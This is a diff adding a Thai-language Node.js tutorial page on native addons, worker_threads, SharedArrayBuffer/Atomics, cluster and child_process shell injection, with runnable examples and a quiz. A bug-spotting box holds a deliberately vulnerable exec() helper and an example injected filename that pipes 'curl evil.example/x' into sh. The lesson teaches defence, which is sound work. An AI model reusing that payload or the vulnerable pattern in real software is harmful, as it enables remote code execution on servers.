@@ -1,0 +1,250 @@
+---
+title: 'Native Code & Workers'
+description: 'N-API แบบย่อ, worker_threads กับ SharedArrayBuffer/Atomics, MessageChannel, การ injection ผ่าน child_process, และ cluster'
+sidebar:
+  order: 5
+---
+
+import NodeRunner from '../../../../components/NodeRunner.tsx';
+import Callout from '../../../../components/Callout.astro';
+import Quiz from '../../../../components/Quiz.tsx';
+import ProgressTracker from '../../../../components/ProgressTracker.tsx';
+import Mermaid from '../../../../components/Mermaid.astro';
+import SpotTheBug from '../../../../components/SpotTheBug.astro';
+
+## Native addon แบบย่อ
+
+**Native addon** คือไฟล์ `.node` ที่ compile แล้ว (จริง ๆ คือ shared library) ที่ JavaScript `require()` ได้เหมือน module ทั่วไป — ใช้เมื่อ package ต้องเรียก system library หรือบีบประสิทธิภาพที่ JS optimize ไปไม่ถึง **N-API** คือ C ABI ที่เสถียรที่ Node เปิดให้เขียนสิ่งเหล่านี้ โดยเฉพาะเพื่อให้ addon ที่ compile กับ Node version หนึ่งยังทำงานได้กับ version หลังจากนั้นโดยไม่ต้อง rebuild native package ที่ publish ส่วนใหญ่มาพร้อม **prebuild** (binary ที่ compile ไว้ล่วงหน้าสำหรับ platform/arch/Node-ABI ที่พบบ่อย) และจะ fallback ไป compile จาก source ด้วย **node-gyp** (ซึ่งต้องมี C++ toolchain และ Python ติดตั้งไว้) ก็ต่อเมื่อไม่มี prebuild ที่ตรงกันเท่านั้น — นี่คือเหตุผลเป๊ะ ๆ ที่ `npm ci` บางทีใช้เวลานานขึ้นชัดเจนหรือล้มเหลวไปเลยใน Docker image แบบ minimal: มันไม่ได้ติดตั้ง JavaScript แต่กำลัง compile C++
+
+## `worker_threads`: thread จริง, heap แยกต่างหาก
+
+`Worker` แต่ละตัวคือ OS thread จริงที่รัน V8 isolate ของตัวเอง — heap ของตัวเอง, event loop ของตัวเอง, global ของตัวเอง ไม่มีอะไรถูกแชร์โดย default คุณต้อง opt-in เป็นรายข้อมูล:
+
+<Mermaid title="Main thread และ worker แต่ละตัวได้ทุกอย่างของตัวเอง ยกเว้นสิ่งที่คุณแชร์อย่างชัดเจน" code={`flowchart TB
+  Main["Main thread\nown V8 isolate, own event loop"] -->|"postMessage()\nstructured-clones the value"| W1["Worker 1\nown V8 isolate, own event loop"]
+  Main -->|"postMessage()\nstructured-clones the value"| W2["Worker 2\nown V8 isolate, own event loop"]
+  Main -.->|"SharedArrayBuffer\nsame underlying memory"| Shared[("shared memory")]
+  W1 -.-> Shared
+  W2 -.-> Shared
+`} />
+
+## พิสูจน์ว่า `SharedArrayBuffer` + `Atomics` ไม่มี update หาย
+
+Worker 4 ตัวเพิ่มค่า counter ที่แชร์กันตัวละ 100,000 ครั้ง ด้วย `SharedArrayBuffer` จริงและ `Atomics.add` (read-modify-write แบบ atomic) การเพิ่มทุกครั้งนับครบ — ไม่มี update หายแม้จะมี 4 thread เข้าถึง memory เดียวกันพร้อมกัน:
+
+export const atomicsCode = `import { Worker, isMainThread, workerData, parentPort } from 'node:worker_threads';
+
+if (isMainThread) {
+  const sab = new SharedArrayBuffer(4);
+  const view = new Int32Array(sab);
+  let done = 0;
+  for (let i = 0; i < 4; i++) {
+    const w = new Worker(new URL(import.meta.url), { workerData: { sab } });
+    w.on('message', () => {
+      done++;
+      if (done === 4) console.log('Atomics counter after 4 workers x 100,000 increments each:', Atomics.load(view, 0));
+    });
+  }
+} else {
+  const view = new Int32Array(workerData.sab);
+  for (let i = 0; i < 100000; i++) Atomics.add(view, 0, 1);
+  parentPort.postMessage('done');
+}
+`;
+
+export const atomicsOut = `Atomics counter after 4 workers x 100,000 increments each: 400000`;
+
+<NodeRunner client:visible code={atomicsCode} node expected={atomicsOut} />
+
+400,000 คือคำตอบที่ถูกต้องทางคณิตศาสตร์เป๊ะ ๆ (4 × 100,000) — `Atomics.add` รับประกันว่า read-modify-write เกิดขึ้นเป็นขั้นตอนเดียวที่แบ่งแยกไม่ได้ ดังนั้น worker สองตัวจะไม่มีทางอ่านค่าเดียวกันแล้วต่างคนต่างบวกเข้าไปจนทำ update หาย แบบที่ `view[0]++` ธรรมดาบน shared memory จะทำได้
+
+## อีกครึ่งหนึ่งของการพิสูจน์: `postMessage` copy ไม่ได้แชร์
+
+ความเข้าใจผิดที่พบบ่อยที่สิ่งนี้เปรียบเทียบด้วยคือการสมมติว่า `postMessage`/`workerData` แชร์ object โดยอ้างอิง มันไม่ใช่ — ทุกค่าที่ข้าม boundary นั้นถูกส่งผ่าน **structured clone algorithm** ซึ่งสร้าง copy ที่เป็นอิสระ:
+
+export const structuredCloneCode = `import { Worker, isMainThread, workerData, parentPort } from 'node:worker_threads';
+
+if (isMainThread) {
+  const counter = { value: 0 }; // a plain object -- NOT a SharedArrayBuffer
+  let received = 0;
+  for (let i = 0; i < 4; i++) {
+    const w = new Worker(new URL(import.meta.url), { workerData: { counter } });
+    w.on('message', (finalValue) => {
+      received++;
+      console.log('worker reported its own copy at:', finalValue);
+      if (received === 4) console.log('main thread counter.value (never touched by any worker):', counter.value);
+    });
+  }
+} else {
+  const localCopy = workerData.counter; // workerData is structuredClone()'d -- a copy, not a reference
+  for (let i = 0; i < 100000; i++) localCopy.value++;
+  parentPort.postMessage(localCopy.value);
+}
+`;
+
+export const structuredCloneOut = `worker reported its own copy at: 100000
+worker reported its own copy at: 100000
+worker reported its own copy at: 100000
+worker reported its own copy at: 100000
+main thread counter.value (never touched by any worker): 0`;
+
+<NodeRunner client:visible code={structuredCloneCode} node expected={structuredCloneOut} />
+
+Copy ของแต่ละ worker ไปถึง 100,000 พอดี (ไม่มี update หายข้าง*ใน*ตัว worker เอง เพราะแต่ละตัวมีสิทธิ์เข้าถึง copy ของตัวเองแบบเดี่ยว) แต่ object ต้นฉบับของ main thread ไม่ถูกแตะเลยแม้แต่นิดเดียว — พิสูจน์ว่า `workerData`/`postMessage` ไม่เคยให้ reference ไปยัง object จริงแก่ worker เลย `structuredClone()` (function global ตัวเดียวกัน ใช้ตรง ๆ ได้) ทำตาม algorithm เดียวกันนี้: มัน deep-copy ค่าส่วนใหญ่ (object, array, Map, Set, date, typed array) แต่ clone function, DOM node และ host object แบบเดียวกันไม่ได้ หรือ (โดยตั้งใจ) class ที่มี private field ที่ไม่ implement algorithm นี้ — พวกนั้น throw `DataCloneError`
+
+`MessageChannel`/`MessagePort` คือ messaging primitive แบบ structured-clone เดียวกับที่ `Worker` ใช้ข้างใน expose ออกมาตรง ๆ สำหรับสร้าง channel สองทางของคุณเอง — รวมถึงระหว่าง port สองตัวที่ส่งให้ worker คนละตัว เพื่อให้ worker คุยกันได้โดยไม่ต้อง route ทุก message ผ่าน main thread
+
+## `child_process`: `spawn`/`execFile` เทียบกับ `exec` และทำไมมันสำคัญเรื่อง injection
+
+`exec()` รัน command string ของมันผ่าน shell จริง ซึ่งหมายความว่า shell metacharacter ใน string นั้นถูกตีความ — รวมถึงตัวที่มาจาก input ที่ไม่น่าเชื่อถือ `execFile()` (และ `spawn()`) ไม่เคยเรียก shell สำหรับ command เอง; argument ถูกส่งเป็น array และไปถึงโปรแกรมเป้าหมายแบบตรงตัว ไม่มีการตีความ metacharacter:
+
+export const execInjectionCode = `import { exec, execFile } from 'node:child_process';
+
+// A deliberately benign "attack" payload -- proves the point without doing anything harmful
+const userInput = 'hello; echo INJECTED';
+
+const execOut = await new Promise((resolve) => {
+  exec('echo ' + userInput, (err, stdout) => resolve(stdout.trim()));
+});
+console.log('exec() result:', JSON.stringify(execOut));
+
+const execFileOut = await new Promise((resolve) => {
+  execFile('echo', [userInput], (err, stdout) => resolve(stdout.trim()));
+});
+console.log('execFile() result:', JSON.stringify(execFileOut));
+`;
+
+export const execInjectionOut = `exec() result: "hello\\nINJECTED"
+execFile() result: "hello; echo INJECTED"`;
+
+<NodeRunner client:visible code={execInjectionCode} node expected={execInjectionOut} />
+
+`exec()` แยก string ตรง `;` แล้วรัน `echo INJECTED` เป็น command จริงตัวที่สอง — นั่นคือ shell injection สาธิตด้วย payload ที่แค่พิมพ์คำเดียว แต่กลไกเดียวกันเป๊ะ ๆ รัน `rm -rf`, ขโมยข้อมูล, หรือเปิด reverse shell ได้ถ้า input เป็นฝ่ายร้ายแทนที่จะไม่มีพิษภัย `execFile()` ส่ง `'hello; echo INJECTED'` ให้ `echo` เป็น argument เดียวแบบตรงตัว — ไม่มี shell เข้ามาเกี่ยวข้อง ไม่มีอะไรให้ inject กฎคือ: ถ้าส่วนไหนของ command มาจากนอกโค้ด source ของคุณเอง ใช้ `execFile`/`spawn` กับ argument array ห้ามใช้ `exec` กับการต่อ string เด็ดขาด
+
+## `cluster`: หลาย process, port เดียว
+
+`cluster` fork OS process เต็มรูปแบบ (ไม่ใช่ thread) ที่แชร์ listening port เดียวกันผ่าน primary process — กลยุทธ์การ scale ที่ต่างจาก `worker_threads` (แยกงานที่กิน CPU) หรือ reverse proxy (route ข้าม process อิสระเอง):
+
+export const clusterCode = `import cluster from 'node:cluster';
+
+if (cluster.isPrimary) {
+  console.log('primary: forking 2 workers');
+  const workers = [cluster.fork(), cluster.fork()];
+  let exited = 0;
+  for (const w of workers) {
+    w.on('exit', (code) => {
+      exited++;
+      if (exited === 2) console.log('both workers exited with code', code);
+    });
+  }
+} else {
+  console.log('worker: doing its (simulated) job, then exiting cleanly');
+  process.exit(0);
+}
+`;
+
+export const clusterOut = `primary: forking 2 workers
+worker: doing its (simulated) job, then exiting cleanly
+worker: doing its (simulated) job, then exiting cleanly
+both workers exited with code 0`;
+
+<NodeRunner client:visible code={clusterCode} node expected={clusterOut} />
+
+ใน server จริง `cluster` worker แต่ละตัวรัน application เต็มรูปแบบ และ primary process round-robin (หรือบางแพลตฟอร์มปล่อยให้ OS load-balance) connection ที่เข้ามาข้ามพวกมัน — วิธีใช้ CPU core หลายตัวสำหรับ Node server ที่กิน I/O หนักโดยไม่ต้องมีโค้ด `worker_threads` เลย แลกกับการที่แต่ละ worker เป็น process แยกเต็มตัวพร้อม memory ของตัวเอง (ไม่มี in-process cache ที่แชร์กันได้โดยไม่มี external store อย่าง Redis)
+
+## Mental Model
+
+`worker_threads` คือการเช่าอพาร์ตเมนต์ที่สองที่ตกแต่งครบ (V8 isolate ของตัวเอง, heap ของตัวเอง, event loop ของตัวเอง) — ไม่มีอะไรจากอพาร์ตเมนต์ของคุณอยู่ที่นั่นเว้นแต่คุณจะส่งไปเองอย่างชัดเจน ไม่ว่าจะเป็น copy (`postMessage`, structured clone) หรือมอบกุญแจห้องที่แชร์กันหนึ่งห้อง (`SharedArrayBuffer`) `child_process` ไม่ได้เช่าอพาร์ตเมนต์ในตึกเดียวกันเลย — มันคือการโทรหาผู้เช่าคนละคนไปเลย (`execFile`/`spawn`) หรือกับ `exec` คือการยื่นโน้ตให้คนแปลกหน้า (shell) แล้วเชื่อว่าเขาจะอ่านมันตรงตามที่เขียนเป๊ะ ๆ ซึ่งเป็นความเชื่อใจที่ `exec` ทำลายพอดีเมื่อโน้ตนั้นมีคำของคนอื่นอยู่
+
+## Trade-offs
+
+Thread (`worker_threads`) สร้างถูกกว่า process และแชร์ memory ตรง ๆ ผ่าน `SharedArrayBuffer` ได้ แต่ crash ที่ล้ม process ทั้งตัวจะพา worker ทุกตัวไปด้วย และโค้ด shared-memory ที่ใช้ `Atomics` เขียนให้ถูกต้องยากกว่า message-passing จริง ๆ Process (`cluster`, `child_process`) แยกจากกันเต็มตัว — ตัวหนึ่ง crash ไม่กระทบตัวอื่น — แลกกับ memory overhead ต่อ instance ที่มากขึ้นและไม่มี shared state ให้ฟรี ๆ อะไรก็ตามที่สอง process ต้องการร่วมกัน (cache, session store) ต้องอยู่ที่ไหนสักที่ที่ทั้งคู่เข้าถึงได้ อย่าง Redis การเข้าถึง shell ของ `exec` ทรงพลังกว่า direct-exec ของ `execFile` อย่างเคร่งครัด (pipe, glob, env expansion ใช้ได้หมด) ซึ่งเป็นพื้นที่เดียวกันเป๊ะ ๆ ที่ทำให้มันอันตรายกับ input ใด ๆ ที่คุณควบคุมไม่ได้เต็มที่เอง
+
+## ความเข้าใจผิดที่พบบ่อย
+
+- **"`postMessage` แชร์ object ระหว่าง thread"** มัน structured-clone มัน — ฝั่งที่รับได้ copy ที่เป็นอิสระ มีแค่ `SharedArrayBuffer` (เข้าถึงผ่าน typed array) เท่านั้นที่เป็น shared memory จริง ๆ
+- **"`Atomics` เกี่ยวกับประสิทธิภาพเท่านั้น"** หน้าที่จริงของมันคือ correctness: ถ้าไม่มีมัน การอ่าน/เขียน shared memory พร้อมกันจากหลาย thread สามารถ interleave กันและทำ update หายได้ มันบังเอิญเปิดใช้ coordination primitive ระดับต่ำด้วย (`Atomics.wait`/`notify`) แต่การรับประกันหลักคือ atomicity ไม่ใช่ความเร็ว
+- **"`execFile` เป็นแค่ `exec` เวอร์ชันช้ากว่าแต่ปลอดภัยกว่า"** มันไม่ช้ากว่าสำหรับงานเทียบเท่ากัน — มันแค่ไม่เคย spawn shell สำหรับ command เป้าหมายเลย ความต่างด้านความปลอดภัยเป็นผลโดยตรงจากการข้าม shell parsing ไปเลย ไม่ใช่ trade-off ด้านประสิทธิภาพ
+
+## อ่านโค้ดที่ AI เขียน
+
+โค้ดที่ AI สร้างซึ่ง shell out เพื่อรัน system command เป็นสิ่งที่คุ้มค่าที่สุดที่จะตรวจสอบให้ละเอียด เพราะความเสี่ยง injection มองไม่เห็นเว้นแต่คุณจะรู้ว่าต้องดูที่ *วิธี* สร้าง command
+
+<SpotTheBug code={`// AI-written "resize an uploaded image" helper
+import { exec } from 'node:child_process';
+
+function resizeImage(filename, width) {
+  exec(\`convert uploads/\${filename} -resize \${width} output/\${filename}\`, (err) => {
+    if (err) console.error('resize failed', err);
+  });
+}
+// filename comes from the original upload's filename, sent by the client
+`}>
+`filename` ถูกควบคุมโดยผู้โจมตี (มันคือชื่ออะไรก็ตามที่ browser ของผู้ upload ส่งมา) และถูก interpolate ตรงเข้าไปใน string ที่ `exec` รันผ่าน shell จริง ชื่อไฟล์แบบ `` a.png; curl evil.example/x | sh `` รัน command แยกที่ผู้โจมตีเลือกเองทั้งหมดหลัง semicolon — shell injection แบบคลาสสิก ไม่ใช่เรื่องสมมติ วิธีแก้คือ `execFile('convert', ['uploads/' + filename, '-resize', String(width), 'output/' + filename], callback)` ซึ่งส่งแต่ละ argument แบบตรงตัวโดยไม่มี shell เข้ามาเกี่ยวข้องเลย บวกกับการ validate/sanitize `filename` ก่อนที่มันจะแตะ filesystem เลย (อย่างน้อยต้องปฏิเสธ path separator และ null byte)
+</SpotTheBug>
+
+<Callout title="สรุปหนึ่งบรรทัด">
+SharedArrayBuffer + Atomics คือ shared memory จริงที่ไม่มี update หาย; postMessage/workerData เป็น copy เสมอ; และ exec() กับ input ใด ๆ ที่คุณควบคุมไม่ได้เต็มที่คือ shell injection ที่รอ payload ที่ใช่อยู่ -- ใช้ execFile/spawn แทน
+</Callout>
+
+export const quizNativeWorkers = [
+  {
+    q: 'worker_threads Worker แต่ละตัวได้อะไรที่ *ไม่* ถูกแชร์กับ main thread โดย default?',
+    options: [
+      'ไม่มีอะไรเลย -- worker แชร์ heap และ event loop ของ main thread',
+      'V8 isolate ของตัวเอง: heap ของตัวเอง, event loop ของตัวเอง, global ของตัวเอง',
+      'มีแค่ event loop ของตัวเองเท่านั้น แต่ heap แชร์กัน',
+      'มีแค่ heap ของตัวเองเท่านั้น แต่ event loop แชร์กัน',
+    ],
+    answer: 1,
+    explain: 'Worker คือ OS thread จริงที่รัน V8 isolate แยกต่างหากเต็มรูปแบบ -- heap เอง, event loop เอง, global เอง การแชร์อะไรก็ตาม (data หรือ memory) ต้องใช้กลไกที่ชัดเจน: postMessage (copy) หรือ SharedArrayBuffer (แชร์จริง)',
+  },
+  {
+    q: 'Worker 4 ตัวต่างรันโค้ดนี้ 100,000 ครั้งบน Int32Array ที่แชร์กัน:\n```js\nAtomics.add(view, 0, 1);\n```\nค่าสุดท้ายคืออะไร และทำไม?',
+    options: [
+      '400,000 พอดี -- Atomics.add คือ read-modify-write ที่แบ่งแยกไม่ได้ ดังนั้นไม่มีการเพิ่มค่าหายเลย',
+      'มักจะน้อยกว่า 400,000 เพราะการเขียนพร้อมกันทำให้ update หาย',
+      '100,000 พอดี -- มีแค่การเขียนของ worker ตัวเดียวเท่านั้นที่มีผลจริง',
+      'เป็น undefined behavior และอาจเป็นค่าอะไรก็ได้',
+    ],
+    answer: 0,
+    explain: 'Operation ของ Atomics รับประกัน atomic ข้าม thread ที่แชร์ SharedArrayBuffer เดียวกัน -- ต่างจาก view[0]++ ธรรมดา สอง thread ไม่มีทางอ่านค่าเดียวกันแล้วต่างคนต่างบวกเข้าไป ดังนั้นผลรวมถูกต้องเป๊ะเสมอ',
+  },
+  {
+    q: 'Worker ได้รับ `workerData: { counter }` ที่ counter เป็น plain object, แก้ counter.value 100,000 ครั้ง แล้วส่งผลลัพธ์กลับ อะไรเกิดขึ้นกับ counter object ต้นฉบับของ main thread?',
+    options: [
+      'มันไปถึงค่า 100,000 ด้วย เพราะ workerData แชร์ reference',
+      'ไม่ได้รับผลกระทบเลย -- workerData ถูกส่งผ่าน structured clone algorithm ดังนั้น worker มีแค่ copy ที่เป็นอิสระเท่านั้น',
+      'มัน throw DataCloneError',
+      'มันกลายเป็น undefined',
+    ],
+    answer: 1,
+    explain: 'workerData (เหมือน postMessage payload ทั่วไป) ถูก structured-clone ไม่ได้แชร์โดยอ้างอิง -- worker แก้ copy ของตัวเอง และ object ของ main thread ไม่ถูกแตะเลย',
+  },
+  {
+    q: 'ทำไมบรรทัดแรกเสี่ยง injection แต่บรรทัดที่สองไม่เสี่ยง สำหรับ userInput เดียวกันเป๊ะ ๆ?\n```js\nexec("echo " + userInput);\nexecFile("echo", [userInput]);\n```',
+    options: [
+      'exec() แค่เป็น function เก่ากว่าที่มีบั๊กเยอะกว่า ไม่มีความต่างจริงในพฤติกรรม',
+      'exec() รัน string ทั้งหมดผ่าน shell จริง ซึ่งตีความ metacharacter อย่าง ; และ | ใน userInput; execFile() ส่ง userInput เป็น argument เดียวแบบตรงตัวโดยไม่มี shell เข้ามาเกี่ยวข้อง',
+      'execFile() escape shell metacharacter ให้อัตโนมัติในทุก argument',
+      'ไม่มีความต่างจริง -- ทั้งคู่เสี่ยงเท่ากัน',
+    ],
+    answer: 1,
+    explain: 'ช่องโหว่นี้เกี่ยวกับการมี shell เข้ามาเกี่ยวข้องทั้งหมด: exec() ส่ง string ทั้งหมดให้ shell parse (ดังนั้น ";", "|", "&&" ฯลฯ ทำงานตามปกติของ shell) ในขณะที่ execFile()/spawn() เรียกโปรแกรมเป้าหมายตรง ๆ ด้วย argument array ข้าม shell parsing ไปเลย',
+  },
+  {
+    q: 'node:cluster fork อะไรจริง ๆ?',
+    options: [
+      'Thread แบบเบา ๆ ภายใน process เดียวกัน เหมือน worker_threads',
+      'OS process แยกเต็มรูปแบบ ที่แชร์ listening port ผ่าน primary process',
+      'Thread เดียวที่ round-robin callback',
+      'มันไม่ fork อะไรเลย -- มันแค่เพิ่ม event loop phase',
+    ],
+    answer: 1,
+    explain: 'cluster.fork() สร้าง child process จริง (แต่ละตัวรัน application เต็มรูปแบบ) ประสานงานโดย primary process เพื่อให้แชร์ listening port เดียวกันได้ -- กลยุทธ์การ scale ระดับ process แยกจากระดับ thread ของ worker_threads',
+  },
+];
+
+<Quiz client:visible id="runtime-internals/native-and-workers" questions={quizNativeWorkers} />
+
+<ProgressTracker client:visible id="runtime-internals/native-and-workers" />
